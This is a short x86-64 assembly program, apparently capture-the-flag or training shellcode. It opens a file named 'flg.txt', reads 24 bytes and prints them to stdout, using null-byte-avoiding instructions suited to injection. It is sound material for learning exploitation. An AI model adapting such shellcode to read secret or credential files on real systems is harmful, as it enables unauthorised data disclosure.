global _start

section .text
_start:
    ; push 'flg.txt\x00'
    xor rsi, rsi
    push rsi             ; push NULL string terminator
    mov rbx, 'flg.txt' ; rest of file name
    push rbx            ; push to stack 
    
    ; open('rsp', 'O_RDONLY')
    mov al, 2          ; open syscall number
    mov rdi, rsp        ; move pointer to filename
    syscall

    ; read file
    mov rsi, rsp      ; pointer to opened file
    mov rdi, rax        ; set fd to rax from open syscall
    xor rax, rax          ; read syscall number
    mov dl, 24         ; size to read
    syscall

    ; write output
    mov al, 1          ; write syscall
    mov dil, 1          ; set fd to stdout
    syscall

    ; exit
    mov al, 60
    xor rdi, rdi
    syscall

